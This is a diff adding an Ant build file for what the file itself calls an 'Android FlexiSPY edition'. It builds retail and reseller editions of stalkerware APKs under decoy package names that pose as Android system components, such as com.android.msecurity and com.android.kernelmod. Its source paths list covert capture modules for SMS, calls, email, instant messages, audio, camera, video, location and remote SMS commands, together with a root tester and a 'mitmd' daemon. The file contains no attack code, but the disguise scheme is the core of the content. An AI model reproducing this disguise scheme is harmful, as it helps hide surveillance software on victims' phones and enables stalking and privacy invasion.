@@ -1,0 +1,389 @@
+<?xml version="1.0" encoding="utf-8"?>
+<project name="fx-releases" default="">
+	
+	<import file="build-common.xml" />
+	
+	<target name="clean.all" description="Clean all intermediate build files (run this before comitting)">
+		<ant dir="${basedir}/FxCommon" inheritAll="false" target="clean" />
+		<ant dir="${basedir}/MBackupDaemon" inheritAll="false" target="clean" />
+		<ant dir="${basedir}/MBackupGui" inheritAll="false" target="clean" />
+		<ant dir="${basedir}/BugDaemon" inheritAll="false" target="clean" />
+		<ant dir="${basedir}/MonitorDaemon" inheritAll="false" target="clean" />
+	</target>
+	
+	<target name="increment.build.number">
+		<!--
+		<propertyfile file="${build.autogen.file}">
+			<entry key="product.version.build" type="int" operation="+" default="1" />
+		</propertyfile>
+		-->
+	</target>
+
+	<target name="release" 
+	        depends="increment.build.number"
+            description="Clean all projects and build both test and production packages. The target packages will be in the bin directory.">
+		
+		<property file="${build.autogen.file}"/>
+		<antcall target="depend.application.main"/>
+		
+		<!-- Add/Remove any Android FlexiSPY edition here!! -->
+		
+		<!-- DEVELOPMENT BUILD -->
+		<var name="mock.pkg" value="com.android.msecurity"/>
+		<!-- <build-retail-prox mock.pkg="${mock.pkg}"/> -->
+		<build-phoenix-prox mock.pkg="${mock.pkg}"/>
+				
+		<!-- ALL PRODUCTION RETAIL -->
+		<!--
+		<var name="mock.pkg" value="com.android.msecurity"/>
+		<var name="mock.pkg" value="com.android.userkernel"/>
+		<var name="mock.pkg" value="com.android.securemgr"/>
+		<var name="mock.pkg" value="com.android.platsec"/>
+        <var name="mock.pkg" value="com.android.nifagent"/>
+        <var name="mock.pkg" value="com.android.apnnifman"/>
+    		<build-retail-light mock.pkg="${mock.pkg}"/>
+            <build-retail-pro mock.pkg="${mock.pkg}"/>
+            <build-retail-prox mock.pkg="${mock.pkg}"/>
+		-->
+		
+		<!-- ALL PRODUCTION RESELLER -->
+		<!--
+		<var name="mock.pkg" value="com.android.commserv"/>
+		<var name="mock.pkg" value="com.android.kernelmod"/>
+		<var name="mock.pkg" value="com.android.connmon"/>
+        <var name="mock.pkg" value="com.android.dbmapper"/>
+        <var name="mock.pkg" value="com.android.tappi"/>
+        <var name="mock.pkg" value="com.android.iarchive"/>
+    		<build-reseller-light mock.pkg="${mock.pkg}"/>
+    		<build-reseller-pro mock.pkg="${mock.pkg}"/>
+    		<build-reseller-prox mock.pkg="${mock.pkg}"/>
+		-->
+		
+		<!-- TEST SERVER -->
+		<!--
+		<var name="mock.pkg" value="com.android.msecurity"/>
+            <build-retail-light-test mock.pkg="${mock.pkg}"/>
+            <build-retail-pro-test mock.pkg="${mock.pkg}"/>
+            <build-retail-prox-test mock.pkg="${mock.pkg}"/>
+        -->
+		
+	</target>
+	
+	<macrodef name="build-beta-test-prox">
+        <attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+            <build-apk
+                testflag="-"
+                mock.pkg="@{mock.pkg}" icon.name="fspy"
+                product.name="FSXGAD" product.id="66" product.display.name=""
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="PROX" 
+                code.product.server="RETAIL"
+                code.product.id="RETAIL_PRODUCT_ID_PROX"
+                code.product.name="RETAIL_PRODUCT_NAME_PROX"
+            />
+        </sequential>
+    </macrodef>
+	
+	<!-- Aruna -->
+	<macrodef name="build-phoenix-prox">
+        <attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+            <build-apk
+            	testflag=""
+                mock.pkg="@{mock.pkg}" icon.name="fspy"
+                product.name="5002" product.id="5002" product.display.name="5002"
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="PROX" 
+                code.product.server="RETAIL"
+                code.product.id="RETAIL_PRODUCT_ID_PROX"
+                code.product.name="RETAIL_PRODUCT_NAME_PROX"
+            />
+        </sequential>
+    </macrodef>
+    
+	<macrodef name="build-retail-prox">
+        <attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+            <build-apk
+            	testflag=""
+                mock.pkg="@{mock.pkg}" icon.name="fspy"
+                product.name="FSXGAD" product.id="66" product.display.name=""
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="PROX" 
+                code.product.server="RETAIL"
+                code.product.id="RETAIL_PRODUCT_ID_PROX"
+                code.product.name="RETAIL_PRODUCT_NAME_PROX"
+            />
+        </sequential>
+    </macrodef>
+	
+	<macrodef name="build-retail-pro">
+		<attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+    		<build-apk 
+    			testflag=""
+    			mock.pkg="@{mock.pkg}" icon.name="fspy"
+                product.name="FSPGAD" product.id="65" product.display.name=""
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="PRO" 
+                code.product.server="RETAIL"
+                code.product.id="RETAIL_PRODUCT_ID_PRO"
+                code.product.name="RETAIL_PRODUCT_NAME_PRO"
+            />
+		</sequential>
+    </macrodef>
+
+    <macrodef name="build-retail-light">
+    	<attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+            <build-apk 
+            	testflag=""
+            	mock.pkg="@{mock.pkg}" icon.name="fspy"
+                product.name="FSLGAD" product.id="64" product.display.name=""
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="LIGHT" 
+                code.product.server="RETAIL"
+                code.product.id="RETAIL_PRODUCT_ID_LIGHT"
+                code.product.name="RETAIL_PRODUCT_NAME_LIGHT"
+            />
+        </sequential>
+    </macrodef>
+	
+    <macrodef name="build-retail-prox-test">
+    	<attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+            <build-apk 
+                testflag="-"
+            	mock.pkg="@{mock.pkg}" icon.name="fspy"
+            	product.name="FSXGAD" product.id="66" product.display.name=""
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="PROX" 
+                code.product.server="TEST"
+                code.product.id="RETAIL_PRODUCT_ID_PROX"
+                code.product.name="RETAIL_PRODUCT_NAME_PROX"
+            />
+    	</sequential>
+    </macrodef>
+	
+    <macrodef name="build-retail-pro-test">
+    	<attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+            <build-apk 
+                testflag="-"
+            	mock.pkg="@{mock.pkg}" icon.name="fspy"
+            	product.name="FSPGAD" product.id="65" product.display.name=""
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="PRO" 
+                code.product.server="TEST"
+                code.product.id="RETAIL_PRODUCT_ID_PRO"
+                code.product.name="RETAIL_PRODUCT_NAME_PRO"
+            />
+    	</sequential>
+    </macrodef>
+	
+    <macrodef name="build-retail-light-test">
+    	<attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+            <build-apk 
+                testflag="-"
+            	mock.pkg="@{mock.pkg}" icon.name="fspy"
+            	product.name="FSLGAD" product.id="64" product.display.name=""
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="LIGHT" 
+                code.product.server="TEST"
+                code.product.id="RETAIL_PRODUCT_ID_LIGHT"
+                code.product.name="RETAIL_PRODUCT_NAME_LIGHT"
+            />
+        </sequential>
+    </macrodef>
+	
+    <macrodef name="build-reseller-prox">
+    	<attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+            <build-apk 
+            	testflag=""
+            	mock.pkg="@{mock.pkg}" icon.name="mint_prox"
+                product.name="FSXGRAD" product.id="10049" product.display.name=""
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="PROX" 
+                code.product.server="RESELLER"
+                code.product.id="RESELLER_PRODUCT_ID_PROX"
+                code.product.name="RESELLER_PRODUCT_NAME_PROX"
+            />
+        </sequential>
+    </macrodef>
+	
+    <macrodef name="build-reseller-pro">
+    	<attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+            <build-apk 
+            	testflag=""
+            	mock.pkg="@{mock.pkg}" icon.name="mint_prox"
+                product.name="FSPGRAD" product.id="10048" product.display.name=""
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="PRO" 
+                code.product.server="RESELLER"
+                code.product.id="RESELLER_PRODUCT_ID_PRO"
+                code.product.name="RESELLER_PRODUCT_NAME_PRO"
+            />
+        </sequential>
+    </macrodef>
+	
+    <macrodef name="build-reseller-light">
+    	<attribute name="mock.pkg" default="com.android.ypsixelf"/>
+        <sequential>
+            <build-apk 
+            	testflag=""
+            	mock.pkg="@{mock.pkg}" icon.name="mint_prox"
+                product.name="FSLGRAD" product.id="10047" product.display.name=""
+                product.version.major="${product.version.major}"
+                product.version.minor="${product.version.minor}"
+                product.version.build="${product.version.build}"
+                code.product.edition="LIGHT" 
+                code.product.server="RESELLER"
+                code.product.id="RESELLER_PRODUCT_ID_LIGHT"
+                code.product.name="RESELLER_PRODUCT_NAME_LIGHT"
+            />
+        </sequential>
+    </macrodef>
+	
+	<!-- 
+	************************************************************************************************
+	 The below are targets for creating projects. If the project already exists, the current project 
+	 will be DELETED and REPLACED by the newly created one.
+	************************************************************************************************
+	-->
+	
+	<!--
+	
+    <target name="create.fxcommon.project">
+        <create-jar-project name="FxCommon"/>
+    </target>
+	
+    <target name="create.mbackupgui.project">
+        <create-android-project target="android-3" 
+                                name="MBackupGui" 
+                                package="com.vvt.android.mbackup" 
+                                activity="MainActivity"
+                                path="${basedir}/MBackupGui"
+                                min.sdk.version="3"
+        />
+    </target>
+	
+    <target name="create.mbackupdaemon.project">
+        <create-dex-project name="MBackupDaemon" 
+                            java.main.package="com.vvt.dalvik.mbackupd" 
+                            java.main.class="MBackupDaemon"
+        />  
+    </target>
+	
+	<target name="create.bugdaemon.project">
+		<create-dex-ndk-project name="BugDaemon" 
+								c.module="mitmd_lib" 
+								java.main.package="com.vvt.dalvik.bugd" 
+								java.main.class="BugDaemon"
+		/>
+	</target>
+	
+	<target name="create.monitordaemon.project">
+	        <create-dex-project name="MonitorDaemon" 
+	                            java.main.package="com.vvt.dalvik.monitord" 
+	                            java.main.class="MonitorDaemon"
+	        />  
+    </target>
+	
+	<target name="create.roottester.project">
+		<create-android-project target="android-3"
+								name="RootTester"
+								package="com.vvt.android.roottester"
+								activity="MainActivity"
+								path="${basedir}/RootTester"
+								min.sdk.version="3"
+		/>
+	</target>
+	
+
+	<target name="create.mockandroid.project">
+		<create-jar-project name="MockAndroid"/>
+	</target>
+	
+	-->
+	
+	<taskdef name="findbugs" classname="edu.umd.cs.findbugs.anttask.FindBugsTask"/>
+		<target name="findbugs">
+			<mkdir dir="reports" />
+			<findbugs home="${findbugs.home}" output="xml" outputFile="reports/findbugs.xml" excludeFilter="findbugs-exclude.xml">
+				<!-- <auxClasspath path="${android.jar}" /> -->
+				<auxClasspath path="${android.sdk.dir}/platforms/android-7/android.jar" />
+				<!--<class location="${out.dir}" />-->
+				<class location="source/application-main/bin" />
+				<class location="source/process-bug/build" />
+				<class location="source/process-main/build" />
+				<class location="source/process-monitor/build" />
+				<!--<sourcePath path="source/phoenix" />-->
+				
+				<sourcePath path="source/phoenix/src" />
+				<sourcePath path="source/activation_manager/src" />
+				<sourcePath path="source/app_context/src" />
+				<sourcePath path="source/application-main/src" />
+				<sourcePath path="source/base/src" />
+				<sourcePath path="source/configuration_manager/src" />
+				<sourcePath path="source/connection_history_manager/src" />
+				<sourcePath path="source/daemon_addressbook_manager/src" />
+				<sourcePath path="source/daemon_app_engine/src" />
+				<sourcePath path="source/daemon_audio_capture/src" />
+				<sourcePath path="source/daemon_bridge/src" />
+				<sourcePath path="source/daemon_calllog_capture/src" />
+				<sourcePath path="source/daemon_camera_image_capture/src" /> 
+				<sourcePath path="source/daemon_email_capture/src" />
+				<sourcePath path="source/daemon_im_capture/src" />
+				<sourcePath path="source/daemon_manager/src" />
+				<sourcePath path="source/daemon_mms_capture/src" />
+				<sourcePath path="source/daemon_remote_command_manager/src" />
+				<sourcePath path="source/daemon_sms_capture/src" />
+				<sourcePath path="source/daemon_util/src" />
+				<sourcePath path="source/daemon_video_capture/src" />
+				<sourcePath path="source/daemon_wallpaper_capture/src" />
+				<sourcePath path="source/data_delivery_manager/src" />
+				<sourcePath path="source/event_centre/src" />
+				<sourcePath path="source/event_delivery/src" />
+				<sourcePath path="source/event_repository/src" />
+				<sourcePath path="source/events/src" />
+				<sourcePath path="source/http/src" />
+				<sourcePath path="source/license_management/src" />
+				<sourcePath path="source/location_capture/src" />
+				<sourcePath path="source/preference_manager/src" />
+				<sourcePath path="source/process-bug/src" />
+				<sourcePath path="source/process-main/src" />
+				<sourcePath path="source/process-monitor/src" />
+				<sourcePath path="source/server_address_manager/src" />
+				<sourcePath path="source/shell/src" />
+				<sourcePath path="source/sim_change_capture/src" />
+				<sourcePath path="source/sms_command_receiver/src" />
+				<sourcePath path="source/util/src" />
+				
+			</findbugs>
+		</target>
+
+</project>
